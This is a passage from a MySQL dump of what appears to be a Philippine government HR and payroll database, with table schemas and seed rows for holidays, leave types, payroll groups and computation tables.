INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('PRC', 'Professional Regulation Commission', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('AssEEBoard', 'Assistant Electrical Engineering Board Examination', '');


#
# TABLE STRUCTURE FOR: tblflagceremony
#

DROP TABLE IF EXISTS `tblflagceremony`;

CREATE TABLE `tblflagceremony` (
  `flag_id` int(11) NOT NULL AUTO_INCREMENT,
  `flag_empNumber` varchar(35) NOT NULL,
  `flag_datetime` datetime NOT NULL,
  `flag_added_by` varchar(35) NOT NULL,
  `flag_added_by_ip` varchar(35) NOT NULL,
  PRIMARY KEY (`flag_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblgroup
#

DROP TABLE IF EXISTS `tblgroup`;

CREATE TABLE `tblgroup` (
  `groupcode` varchar(10) NOT NULL DEFAULT '',
  `officecode` varchar(10) NOT NULL DEFAULT '',
  `groupname` varchar(255) NOT NULL DEFAULT '',
  `grouphead` varchar(50) NOT NULL DEFAULT '',
  `groupheadtitle` varchar(50) NOT NULL DEFAULT '',
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  PRIMARY KEY (`groupcode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblgroup1
#

DROP TABLE IF EXISTS `tblgroup1`;

CREATE TABLE `tblgroup1` (
  `group1Code` varchar(20) NOT NULL DEFAULT '',
  `group1Name` text NOT NULL,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `group1HeadTitle` varchar(20) NOT NULL DEFAULT '',
  `group1Secretary` varchar(20) NOT NULL DEFAULT '',
  `group1Custodian` varchar(20) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblgroup2
#

DROP TABLE IF EXISTS `tblgroup2`;

CREATE TABLE `tblgroup2` (
  `group1Code` varchar(20) NOT NULL DEFAULT '',
  `group2Code` varchar(20) NOT NULL DEFAULT '',
  `group2Name` text NOT NULL,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `group2HeadTitle` varchar(10) NOT NULL DEFAULT '',
  `group2Secretary` varchar(20) NOT NULL DEFAULT '',
  `group2Custodian` varchar(20) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblgroup3
#

DROP TABLE IF EXISTS `tblgroup3`;

CREATE TABLE `tblgroup3` (
  `group1Code` varchar(20) NOT NULL DEFAULT '',
  `group2Code` varchar(20) NOT NULL DEFAULT '',
  `group3Code` varchar(20) NOT NULL DEFAULT '',
  `group3Name` text NOT NULL,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `group3HeadTitle` varchar(10) NOT NULL DEFAULT '',
  `group3Secretary` varchar(20) NOT NULL DEFAULT '',
  `group3Custodian` varchar(20) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblgroup4
#

DROP TABLE IF EXISTS `tblgroup4`;

CREATE TABLE `tblgroup4` (
  `group1Code` varchar(20) NOT NULL DEFAULT '',
  `group2Code` varchar(20) NOT NULL DEFAULT '',
  `group3Code` varchar(20) NOT NULL DEFAULT '',
  `group4Code` varchar(20) NOT NULL DEFAULT '',
  `group4Name` text NOT NULL,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `group4HeadTitle` varchar(10) NOT NULL DEFAULT '',
  `group4Secretary` varchar(20) NOT NULL DEFAULT '',
  `group4Custodian` varchar(20) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblgroup5
#

DROP TABLE IF EXISTS `tblgroup5`;

CREATE TABLE `tblgroup5` (
  `group1Code` varchar(20) NOT NULL DEFAULT '',
  `group2Code` varchar(20) NOT NULL DEFAULT '',
  `group3Code` varchar(20) NOT NULL DEFAULT '',
  `group4Code` varchar(20) NOT NULL DEFAULT '',
  `group5Code` varchar(20) NOT NULL DEFAULT '',
  `group5Name` text NOT NULL,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `group5HeadTitle` varchar(10) NOT NULL DEFAULT '',
  `group5Secretary` varchar(20) NOT NULL DEFAULT '',
  `group5Custodian` varchar(20) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblholiday
#

DROP TABLE IF EXISTS `tblholiday`;

CREATE TABLE `tblholiday` (
  `holidayCode` varchar(20) NOT NULL DEFAULT '',
  `holidayName` varchar(30) NOT NULL DEFAULT '',
  `holidayMonth` varchar(10) DEFAULT NULL,
  `holidayDay` char(2) DEFAULT NULL,
  `fixedHoliday` char(1) NOT NULL DEFAULT 'N',
  PRIMARY KEY (`holidayCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('LD01', 'Labor Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('BONI', 'Bonifacio Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('RD', 'Rizal Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('BD09', 'Bataan Day', '4', '9', 'Y');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('HD', 'Holiday', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('ID12', 'Independence Day', '6', '12', 'Y');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('KD06', 'Araw ng Kagitingan', '5', '29', 'Y');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('PP25', 'Edsa People Power Anniversary', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('SPH', 'Special Holiday', '7', '01', 'N');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('ASD2', 'All Soul\'s Day', '11', '02', 'Y');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('RD01', 'Ramadan', '11', '26', 'Y');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('NYD', 'New Year Day', '1', '1', 'Y');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('HDAM', 'Half Day AM', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('TAGUIG', 'Taguig Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('MT', 'Maundy Thursday', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('HDPM', 'Half Day PM', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('GF', 'Good Friday', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('CD', 'Christmas Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('NAD', 'Ninoy Aquino Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('NYE', 'New Years Eve', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('SNWD', 'Special Non-Working Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('CN', 'Chinese New Year', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('LELEC', 'Local Election', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('EA', 'Eid l Adha', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('TYP2014', 'Typhoon Mario', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('WS', 'Work Suspended', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('ASD1', 'All Saints Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('EDF', 'Eidl Fitr', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('Lastday', 'Last Day of the Year', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('CNY', 'Chinese New Year', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('TYP', 'Typhoon Glenda', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('DH', 'Declared Holiday', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('DAH', 'Declared Holiday', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('SHB', 'SENT HOME', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('NHD', 'National Heroes Day', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('EDLA', 'Eidl Adha', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('NLELEC', 'National and Local Elections', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('MCNO37', 'Suspended OP', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('', '', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('ADH', 'Additional Holiday', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('IFOC', 'Feast of Mary Immaculate ', '', '', '');
INSERT INTO `tblholiday` (`holidayCode`, `holidayName`, `holidayMonth`, `holidayDay`, `fixedHoliday`) VALUES ('TDOP', 'Typhoon Ulysses', '', '', '');


#
# TABLE STRUCTURE FOR: tblholidayyear
#

DROP TABLE IF EXISTS `tblholidayyear`;

CREATE TABLE `tblholidayyear` (
  `holidayId` int(11) NOT NULL AUTO_INCREMENT,
  `holidayCode` varchar(20) NOT NULL DEFAULT '',
  `holidayDate` date NOT NULL DEFAULT '0000-00-00',
  `holidayTime` varchar(15) NOT NULL,
  PRIMARY KEY (`holidayId`),
  KEY `idx_holidayDate` (`holidayDate`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblid
#

DROP TABLE IF EXISTS `tblid`;

CREATE TABLE `tblid` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblincome
#

DROP TABLE IF EXISTS `tblincome`;

CREATE TABLE `tblincome` (
  `incomeCode` varchar(15) NOT NULL DEFAULT '',
  `incomeDesc` varchar(50) NOT NULL DEFAULT '',
  `fixedSwitch` char(1) NOT NULL DEFAULT '',
  `incomeAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `incomeType` varchar(20) NOT NULL DEFAULT '0',
  `recipient` varchar(150) NOT NULL DEFAULT 'ALL',
  `hidden` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblleave
#

DROP TABLE IF EXISTS `tblleave`;

CREATE TABLE `tblleave` (
  `leaveCode` char(3) NOT NULL DEFAULT '',
  `leaveType` varchar(50) NOT NULL DEFAULT '',
  `numOfDays` int(11) NOT NULL DEFAULT 0,
  `system` tinyint(4) NOT NULL DEFAULT 1,
  PRIMARY KEY (`leaveCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblleave` (`leaveCode`, `leaveType`, `numOfDays`, `system`) VALUES ('STL', 'Study Leave', '0', '1');
INSERT INTO `tblleave` (`leaveCode`, `leaveType`, `numOfDays`, `system`) VALUES ('FL', 'Forced Leave', '5', '1');
INSERT INTO `tblleave` (`leaveCode`, `leaveType`, `numOfDays`, `system`) VALUES ('SL', 'Sick Leave', '0', '1');
INSERT INTO `tblleave` (`leaveCode`, `leaveType`, `numOfDays`, `system`) VALUES ('VL', 'Vacation Leave', '0', '1');
INSERT INTO `tblleave` (`leaveCode`, `leaveType`, `numOfDays`, `system`) VALUES ('PL', 'Special Leave', '3', '1');
INSERT INTO `tblleave` (`leaveCode`, `leaveType`, `numOfDays`, `system`) VALUES ('MTL', 'Maternity Leave', '60', '1');
INSERT INTO `tblleave` (`leaveCode`, `leaveType`, `numOfDays`, `system`) VALUES ('PTL', 'Paternity Leave', '7', '1');


#
# TABLE STRUCTURE FOR: tbllocalholiday
#

DROP TABLE IF EXISTS `tbllocalholiday`;

CREATE TABLE `tbllocalholiday` (
  `holidayCode` varchar(20) NOT NULL DEFAULT '',
  `holidayName` varchar(30) NOT NULL DEFAULT '',
  `holidayMonth` varchar(10) NOT NULL DEFAULT '',
  `holidayDay` char(2) NOT NULL DEFAULT '',
  `holidayYear` varchar(10) NOT NULL DEFAULT '',
  `holidayDate` date NOT NULL DEFAULT '0000-00-00'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblmanualdtr
#

DROP TABLE IF EXISTS `tblmanualdtr`;

CREATE TABLE `tblmanualdtr` (
  `dtr_id` int(11) NOT NULL AUTO_INCREMENT,
  `dtr_name` varchar(50) NOT NULL,
  `dtr_ip` varchar(30) NOT NULL,
  PRIMARY KEY (`dtr_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblnonpermcomputation
#

DROP TABLE IF EXISTS `tblnonpermcomputation`;

CREATE TABLE `tblnonpermcomputation` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fk_id` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(30) NOT NULL DEFAULT '',
  `salary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `basicSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `nodays_absent` int(11) NOT NULL DEFAULT 0,
  `nodays_present` int(11) NOT NULL DEFAULT 0,
  `totalOTHour` int(11) NOT NULL DEFAULT 0,
  `totalOTMinute` int(11) NOT NULL DEFAULT 0,
  `totalTardyHour` int(11) NOT NULL DEFAULT 0,
  `totalTardyMinute` int(11) NOT NULL DEFAULT 0,
  `no_workingdays` int(11) NOT NULL DEFAULT 0,
  `Remarks` text NOT NULL,
  `dayabsentamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `hourOTamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `minuteOTamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `tardyhouramount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `tardyminuteamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `lateamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblnonpermcomputationinstance
#

DROP TABLE IF EXISTS `tblnonpermcomputationinstance`;

CREATE TABLE `tblnonpermcomputationinstance` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `startDate` date NOT NULL DEFAULT '0000-00-00',
  `endDate` date NOT NULL DEFAULT '0000-00-00',
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `pmonth` int(11) NOT NULL DEFAULT 0,
  `pyear` int(11) NOT NULL DEFAULT 0,
  `status` int(11) NOT NULL DEFAULT 0,
  `period` int(11) NOT NULL DEFAULT 0,
  `payrollGroupCode` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblnonpermcomputationx
#

DROP TABLE IF EXISTS `tblnonpermcomputationx`;

CREATE TABLE `tblnonpermcomputationx` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fk_id` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(30) NOT NULL DEFAULT '',
  `salary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `basicSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `nodays_absent` int(11) NOT NULL DEFAULT 0,
  `nodays_present` int(11) NOT NULL DEFAULT 0,
  `totalOTHour` int(11) NOT NULL DEFAULT 0,
  `totalOTMinute` int(11) NOT NULL DEFAULT 0,
  `totalTardyHour` int(11) NOT NULL DEFAULT 0,
  `totalTardyMinute` int(11) NOT NULL DEFAULT 0,
  `no_workingdays` int(11) NOT NULL DEFAULT 0,
  `Remarks` text NOT NULL,
  `dayabsentamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `hourOTamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `minuteOTamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `tardyhouramount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `tardyminuteamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `lateamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblofficex
#

DROP TABLE IF EXISTS `tblofficex`;

CREATE TABLE `tblofficex` (
  `officecode` varchar(10) NOT NULL DEFAULT '',
  `officename` varchar(255) NOT NULL DEFAULT '',
  `officehead` varchar(50) NOT NULL DEFAULT '',
  `officeheadtitle` varchar(50) NOT NULL DEFAULT '',
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  PRIMARY KEY (`officecode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblonlinedtr_hcd
#

DROP TABLE IF EXISTS `tblonlinedtr_hcd`;

CREATE TABLE `tblonlinedtr_hcd` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(50) NOT NULL,
  `dtrDate` date NOT NULL DEFAULT '0000-00-00',
  `fullName` varchar(255) NOT NULL,
  `temperature` float NOT NULL,
  `sex` char(1) NOT NULL DEFAULT 'M',
  `age` int(11) NOT NULL,
  `residence_contact` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `natureVisit` varchar(50) NOT NULL,
  `natureOb` varchar(50) NOT NULL,
  `companyName` varchar(255) NOT NULL,
  `companyAddress` varchar(255) NOT NULL,
  `q1_1` tinyint(1) NOT NULL,
  `q1_1_txt` varchar(255) NOT NULL,
  `q1_2` tinyint(1) NOT NULL,
  `q1_3` tinyint(1) NOT NULL,
  `q1_4` tinyint(1) NOT NULL,
  `q1_5` tinyint(1) NOT NULL,
  `q1_6` tinyint(1) NOT NULL,
  `q1_7` tinyint(1) NOT NULL,
  `q1_8` tinyint(1) NOT NULL,
  `q1_9` tinyint(1) NOT NULL,
  `q1_10` tinyint(1) NOT NULL,
  `q1_11` tinyint(1) NOT NULL,
  `q1_12` tinyint(1) NOT NULL,
  `q1_13` tinyint(1) NOT NULL,
  `q1_14` tinyint(1) NOT NULL,
  `q2` tinyint(1) NOT NULL,
  `q3` tinyint(1) NOT NULL,
  `q4` tinyint(1) NOT NULL,
  `q5` tinyint(1) NOT NULL,
  `q5_txt` varchar(255) NOT NULL,
  `q6` tinyint(1) NOT NULL,
  `q6_txt` varchar(255) NOT NULL,
  `signature` varchar(50) NOT NULL,
  `signatureDate` date NOT NULL DEFAULT '0000-00-00',
  `wfh` tinyint(4) NOT NULL DEFAULT 1,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

#
# TABLE STRUCTURE FOR: tblotcomputation
#

DROP TABLE IF EXISTS `tblotcomputation`;

CREATE TABLE `tblotcomputation` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fk_id` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(30) NOT NULL DEFAULT '',
  `salary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `basicSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `totalOTHour` int(11) NOT NULL DEFAULT 0,
  `totalOTMinute` int(11) NOT NULL DEFAULT 0,
  `hourOTamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `minuteOTamount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `taxOTAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `creditableAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblotcomputationinstance
#

DROP TABLE IF EXISTS `tblotcomputationinstance`;

CREATE TABLE `tblotcomputationinstance` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `startDate` date NOT NULL DEFAULT '0000-00-00',
  `endDate` date NOT NULL DEFAULT '0000-00-00',
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `pmonth` int(11) NOT NULL DEFAULT 0,
  `pyear` int(11) NOT NULL DEFAULT 0,
  `status` int(11) NOT NULL DEFAULT 0,
  `payrollGroupCode` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblpayrollgroup
#

DROP TABLE IF EXISTS `tblpayrollgroup`;

CREATE TABLE `tblpayrollgroup` (
  `payrollGroupCode` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `payrollGroupName` varchar(200) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `projectCode` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `payrollGroupOrder` int(11) NOT NULL DEFAULT 0,
  `payrollGroupRC` varchar(30) COLLATE latin1_general_ci NOT NULL DEFAULT '-',
  PRIMARY KEY (`payrollGroupCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

#
# TABLE STRUCTURE FOR: tblpayrollofficer
#

DROP TABLE IF EXISTS `tblpayrollofficer`;

CREATE TABLE `tblpayrollofficer` (
  `poID` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) NOT NULL DEFAULT '',
  `payrollGroupCode` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`poID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblpayrollprocess
#

DROP TABLE IF EXISTS `tblpayrollprocess`;

CREATE TABLE `tblpayrollprocess` (
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `processWith` varchar(200) NOT NULL DEFAULT '',
  `computation` varchar(30) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblpayrollprocess` (`appointmentCode`, `processWith`, `computation`) VALUES ('GIA', 'GIA', 'Semimonthly');
INSERT INTO `tblpayrollprocess` (`appointmentCode`, `processWith`, `computation`) VALUES ('JO', 'JO', 'Daily');
INSERT INTO `tblpayrollprocess` (`appointmentCode`, `processWith`, `computation`) VALUES ('P', 'CT,PC1,PC2,PC3,PC4,PC5,CTI,E,O,PA,SE,SU,T,P', 'Monthly');
INSERT INTO `tblpayrollprocess` (`appointmentCode`, `processWith`, `computation`) VALUES ('CONT', 'CONT', 'Daily');
INSERT INTO `tblpayrollprocess` (`appointmentCode`, `processWith`, `computation`) VALUES (' ', 'GIA-1, ', 'Semimonthly');


#
# TABLE STRUCTURE FOR: tblpayrolregister
#

DROP TABLE IF EXISTS `tblpayrolregister`;

CREATE TABLE `tblpayrolregister` (
  `period` int(11) NOT NULL DEFAULT 0,
  `employeeAppoint` varchar(20) NOT NULL DEFAULT '',
  `pageNo` int(11) NOT NULL DEFAULT 0,
  `BASIC` decimal(10,2) NOT NULL DEFAULT 0.00,
  `BASIC2` decimal(10,2) NOT NULL DEFAULT 0.00,
  `EARNED` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ACA` decimal(10,2) NOT NULL DEFAULT 0.00,
  `PERA` decimal(10,2) NOT NULL DEFAULT 0.00,
  `RA` decimal(10,2) NOT NULL DEFAULT 0.00,
  `TA` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ADJUST` decimal(10,2) NOT NULL DEFAULT 0.00,
  `RICE` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ITW` decimal(10,2) NOT NULL DEFAULT 0.00,
  `GSIS` decimal(10,2) NOT NULL DEFAULT 0.00,
  `GSL` decimal(10,2) NOT NULL DEFAULT 0.00,
  `PROVI` decimal(10,2) NOT NULL DEFAULT 0.00,
  `OTHERDEDUCT` decimal(10,2) NOT NULL DEFAULT 0.00,
  `NETPAY` decimal(10,2) NOT NULL DEFAULT 0.00,
  `payRegMonth` int(11) NOT NULL DEFAULT 0,
  `payRegYear` year(4) NOT NULL DEFAULT 0000,
  `dateTime` varchar(30) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblpayrolregisterzone
#

DROP TABLE IF EXISTS `tblpayrolregisterzone`;

CREATE TABLE `tblpayrolregisterzone` (
  `period` int(11) NOT NULL DEFAULT 0,
  `employeeAppoint` varchar(20) NOT NULL DEFAULT '',
  `pageNo` int(11) NOT NULL DEFAULT 0,
  `BASIC` decimal(10,2) NOT NULL DEFAULT 0.00,
  `BASIC2` decimal(10,2) NOT NULL DEFAULT 0.00,
  `EARNED` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ACA` decimal(10,2) NOT NULL DEFAULT 0.00,
  `PERA` decimal(10,2) NOT NULL DEFAULT 0.00,
  `RA` decimal(10,2) NOT NULL DEFAULT 0.00,
  `TA` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ADJUST` decimal(10,2) NOT NULL DEFAULT 0.00,
  `RICE` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ITW` decimal(10,2) NOT NULL DEFAULT 0.00,
  `GSIS` decimal(10,2) NOT NULL DEFAULT 0.00,
  `GSL` decimal(10,2) NOT NULL DEFAULT 0.00,
  `PROVI` decimal(10,2) NOT NULL DEFAULT 0.00,
  `OTHERDEDUCT` decimal(10,2) NOT NULL DEFAULT 0.00,
  `NETPAY` decimal(10,2) NOT NULL DEFAULT 0.00,
  `payRegMonth` int(11) NOT NULL DEFAULT 0,
  `payRegYear` year(4) NOT NULL DEFAULT 0000,
  `dateTime` varchar(30) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblphilhealthrange
#

DROP TABLE IF EXISTS `tblphilhealthrange`;

CREATE TABLE `tblphilhealthrange` (
  `philhealthFrom` decimal(10,2) NOT NULL DEFAULT 0.00,
  `philhealthTo` decimal(10,2) NOT NULL DEFAULT 0.00,
  `philSalaryBase` decimal(10,2) NOT NULL DEFAULT 0.00,
  `philMonthlyContri` decimal(10,2) NOT NULL DEFAULT 0.00
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblphilhealthrange` (`philhealthFrom`, `philhealthTo`, `philSalaryBase`, `philMonthlyContri`) VALUES ('26000.00', '26999.99', '26000.00', '650.00');
